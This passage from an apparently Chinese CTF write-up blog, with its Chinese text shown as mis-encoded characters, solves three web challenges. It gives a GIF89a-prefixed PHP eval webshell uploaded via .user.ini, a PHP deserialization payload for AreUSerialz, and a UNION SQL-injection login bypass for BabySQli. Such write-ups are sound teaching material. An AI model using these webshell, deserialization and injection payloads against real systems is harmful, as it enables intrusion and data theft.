&#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;  <span class="comment">//æ–‡ä»¶å†…å®¹ä¸èƒ½&quot;<span class="meta">&lt;?</span>&quot;,å³phpæ–‡ä»¶å¤´éƒ¨æ‰¾åˆ°ä¸€ä¸ª&lt;script language=php&gt;eval($_POST[shell])&lt;/script&gt; æ˜¯å¯è¡Œçš„ã€‚è¿™ä¸ªä¸€å¥è¯shellæ˜¯ä¸€ä¸ªscriptæ ‡ç­¾ï¼Œåˆ©ç”¨languageå±æ€§å¯ä»¥æŒ‡å®šè„šæœ¬è¯­è¨€çš„ç‰¹æ€§ï¼Œè°ƒç”¨phpè§£é‡Šå™¨ï¼Œè¿è¡Œphpä»£ç </span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$tmp_name</span>);  <span class="comment">//åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œæ˜¯å¦æ˜¯å›¾ç‰‡ï¼Œé€šè¿‡åˆ¤æ–­æ–‡ä»¶å¤´éƒ¨gif89aæ–‡ä»¶å¤´æ£€æµ‹æ˜¯æŒ‡ç¨‹åºä¸ºäº†ä»–äººå°†aspç­‰æ–‡ä»¶åç¼€æ”¹ä¸ºgifåä¸Šä¼ ,è¯»å–gifæ–‡ä»¶å¤´,æ£€æµ‹æ˜¯å¦æœ‰gif87aæˆ–gif89aæ ‡è®°ã€‚åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ gif87aå³å¯ç»•è¿‡</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$userdir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$name</span>;</span><br><span class="line">    move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$upload_file_path</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . <span class="variable">$userdir</span>. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    var_dump(scandir(<span class="variable">$userdir</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h5><p>ç¼–å†™.user.intæ–‡ä»¶ä¸Šä¼ </p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto<span class="built_in">_</span>prepend<span class="built_in">_</span>file=ye.jpg</span><br></pre></td></tr></table></figure>

<p>ç¼–å†™ye.jpgä¸Šä¼ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27;ye&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="ä»é¢˜ç›®ä¸­å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šè¢«åŒ…å«åœ¨ä¸Šä¼ ç›®å½•çš„index-phpæ–‡ä»¶ä¸­ï¼Œç”¨index-phpè¿æ¥èšå‰‘ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚"><a href="#ä»é¢˜ç›®ä¸­å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šè¢«åŒ…å«åœ¨ä¸Šä¼ ç›®å½•çš„index-phpæ–‡ä»¶ä¸­ï¼Œç”¨index-phpè¿æ¥èšå‰‘ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚" class="headerlink" title="ä»é¢˜ç›®ä¸­å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šè¢«åŒ…å«åœ¨ä¸Šä¼ ç›®å½•çš„index.phpæ–‡ä»¶ä¸­ï¼Œç”¨index.phpè¿æ¥èšå‰‘ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚"></a>ä»é¢˜ç›®ä¸­å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šè¢«åŒ…å«åœ¨ä¸Šä¼ ç›®å½•çš„index.phpæ–‡ä»¶ä¸­ï¼Œç”¨index.phpè¿æ¥èšå‰‘ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚</h5><p>index.phpæ˜¯ç©ºçš„ï¼Œä¸”æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p>
<h4 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//åˆå§‹åŒ–èµ‹å€¼ä¸ä¼šæ‰§è¡Œè¿™ä¸ª</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;process(); </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;å½“opä¸º<span class="number">1</span>æ—¶æ‰§è¡Œwriteæ–¹æ³•</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();     </span><br><span class="line">    </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;å½“opä¸º<span class="number">2</span>æ—¶æ‰§è¡Œreadæ–¹æ³•</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">    </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;<span class="comment">//å£°æ˜äº†å†™æ–¹æ³•ï¼Œå¹¶å¯¹å…¶å†™å…¥é•¿åº¦è¿›è¡Œäº†é™åˆ¶</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">    </span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;<span class="comment">//å£°æ˜readæ–¹æ³•</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);<span class="comment">//æ³¨æ„è¿™é‡Œæ‰§è¡Œçš„ä¸œè¥¿ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ°ï¼Œå› ä¸ºè¦æŠŠflag.phpæ”¾åœ¨è¿™é‡Œæ‰§è¡Œ</span></span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//å¼•å…¥$så‚æ•°</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;<span class="comment">//å¹¶è®©å…¶è¾“å‡º</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//é€šè¿‡è¿™ä¸ªæ–¹æ³•è¯•opæŒ‡å‘2å’Œ1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)  <span class="comment">//èµ‹å€¼int 2</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)<span class="comment">//å¦‚æœiçš„é•¿åº¦å°äºs</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))<span class="comment">//å¹¶ä¸”ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç å¤§äºç­‰äº32å°äº125ï¼Œå°±æ­£ç¡®</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;    <span class="comment">//ä¼ ä¸€ä¸ªstrå‚æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];<span class="comment">//å°†strå¼ºåˆ¶è½¬æˆstrå‹</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;<span class="comment">//å¦‚æœé€šè¿‡is_validæ–¹æ³•çš„éªŒè¯</span></span><br><span class="line">    </span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);<span class="comment">//å°±å°†strååºåˆ—åŒ–å‡ºæ¥</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>is_valid()å‡½æ•°ï¼Œå› ä¸ºprotectedç±»å‹çš„å±æ€§çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åŒ…å«ä¸å¯è§å­—ç¬¦\00ï¼Œä¼šè¢«is_valid()å‡½æ•°ç»™banæ‰ã€‚</p>
<p>php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥æœ¬åœ°åºåˆ—åŒ–å°±ç›´æ¥ç”¨publicå°±å¯ä»¥ç»•è¿‡äº†.</p>
<p>å¦å¤–å°±æ˜¯åœ¨è¿›è¡Œread()ä¹‹å‰å°±ä¼šè°ƒç”¨__destruct()é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœ$this-&gt;op === â€œ2â€å°±ä¼šè®¾ç½®$this-&gt;opä¸ºâ€1â€ï¼Œè€Œâ€1â€æ˜¯ä¸èƒ½è°ƒç”¨read()æ¥æ–‡ä»¶è¯»å–çš„ã€‚å¯ä»¥å‘ç°ï¼š</p>
<p>__destruct()æ–¹æ³•å†…ä½¿ç”¨äº†ä¸¥æ ¼ç›¸ç­‰$this-&gt;op === â€œ2â€</p>
<p>process()æ–¹æ³•å†…ä½¿ç”¨äº†ä¸ä¸¥æ ¼ç›¸ç­‰else if ($this-&gt;op == â€œ2â€)</p>
<p>æ‰€ä»¥è¿™é‡Œä½¿ç”¨å¼±ç±»å‹2 == â€œ2â€ç»•è¿‡å³å¯ã€‚<br>æœ€ç»ˆçš„payloadï¼šO:11:â€FileHandlerâ€:3:{s:2:â€opâ€;s:1:â€2â€;s:8:â€filenameâ€;s:8:â€flag.phpâ€;s:7:â€contentâ€;s:1:â€2â€;}  å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p>å…ˆbases32å†base64å¾—åˆ°ï¼šselect * from user where username = â€˜$nameâ€™</p>
<p>Orderæ²¡è¢«è¿‡æ»¤</p>
<p>adminâ€™ ORDER by 3#    æç¤ºwrong pass!</p>
<p>adminâ€™ ORDER by 4#    æç¤ºError: Unknown column â€˜4â€™ in â€˜order clauseâ€™   å¯çŸ¥åˆ—æ•°ä¸º4</p>
<h5 id="æœ¬é¢˜è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œä½†åˆ·æ–°ä¹‹åä¼šæ¶ˆå¤±ï¼ŒæŸ¥è¯¢å¯ä»¥æŸ¥åˆ°ã€‚å¯†ç éªŒè¯ä¸€èˆ¬éƒ½æ˜¯md5éªŒè¯ã€‚"><a href="#æœ¬é¢˜è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œä½†åˆ·æ–°ä¹‹åä¼šæ¶ˆå¤±ï¼ŒæŸ¥è¯¢å¯ä»¥æŸ¥åˆ°ã€‚å¯†ç éªŒè¯ä¸€èˆ¬éƒ½æ˜¯md5éªŒè¯ã€‚" class="headerlink" title="æœ¬é¢˜è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œä½†åˆ·æ–°ä¹‹åä¼šæ¶ˆå¤±ï¼ŒæŸ¥è¯¢å¯ä»¥æŸ¥åˆ°ã€‚å¯†ç éªŒè¯ä¸€èˆ¬éƒ½æ˜¯md5éªŒè¯ã€‚"></a>æœ¬é¢˜è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œä½†åˆ·æ–°ä¹‹åä¼šæ¶ˆå¤±ï¼ŒæŸ¥è¯¢å¯ä»¥æŸ¥åˆ°ã€‚å¯†ç éªŒè¯ä¸€èˆ¬éƒ½æ˜¯md5éªŒè¯ã€‚</h5><p>name=1â€™ union select 1,â€™adminâ€™,â€™c4ca4238a0b923820dcc509a6f75849bâ€™#&amp;pw=1 </p>
<p>å³å¯å¾—åˆ°flagã€‚</p>
<h5 id="æ¥ä¸‹é‡Œå°±æ˜¯è¦ç»•è¿‡å¯†ç çš„md5éªŒè¯ï¼Œéœ€è¦æŠŠæˆ‘ä»¬è¾“å…¥çš„å€¼å’Œæ•°æ®åº“é‡Œé¢å­˜æ”¾çš„ç”¨æˆ·å¯†ç çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¯ä»¥ç”¨è”åˆæŸ¥è¯¢è¯­å¥ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„è¡¨æ•°æ®"><a href="#æ¥ä¸‹é‡Œå°±æ˜¯è¦ç»•è¿‡å¯†ç çš„md5éªŒè¯ï¼Œéœ€è¦æŠŠæˆ‘ä»¬è¾“å…¥çš„å€¼å’Œæ•°æ®åº“é‡Œé¢å­˜æ”¾çš„ç”¨æˆ·å¯†ç çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¯ä»¥ç”¨è”åˆæŸ¥è¯¢è¯­å¥ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„è¡¨æ•°æ®" class="headerlink" title="æ¥ä¸‹é‡Œå°±æ˜¯è¦ç»•è¿‡å¯†ç çš„md5éªŒè¯ï¼Œéœ€è¦æŠŠæˆ‘ä»¬è¾“å…¥çš„å€¼å’Œæ•°æ®åº“é‡Œé¢å­˜æ”¾çš„ç”¨æˆ·å¯†ç çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¯ä»¥ç”¨è”åˆæŸ¥è¯¢è¯­å¥ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„è¡¨æ•°æ®"></a>æ¥ä¸‹é‡Œå°±æ˜¯è¦ç»•è¿‡å¯†ç çš„md5éªŒè¯ï¼Œéœ€è¦æŠŠæˆ‘ä»¬è¾“å…¥çš„å€¼å’Œæ•°æ®åº“é‡Œé¢å­˜æ”¾çš„ç”¨æˆ·å¯†ç çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¯ä»¥ç”¨è”åˆæŸ¥è¯¢è¯­å¥ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„è¡¨æ•°æ®</h5><p>æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line">&lt;title&gt;<span class="keyword">Do</span> you know who am I?&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å»é™¤è½¬ä¹‰</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stripslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$value</span> = is_array(<span class="variable">$value</span>) ?</span><br><span class="line">		array_map(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$value</span>) :</span><br><span class="line">		stripslashes(<span class="variable">$value</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$_POST</span> = array_map(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$_GET</span> = array_map(<span class="string">&#x27;stripslashes_deep&#x27;</span>, <span 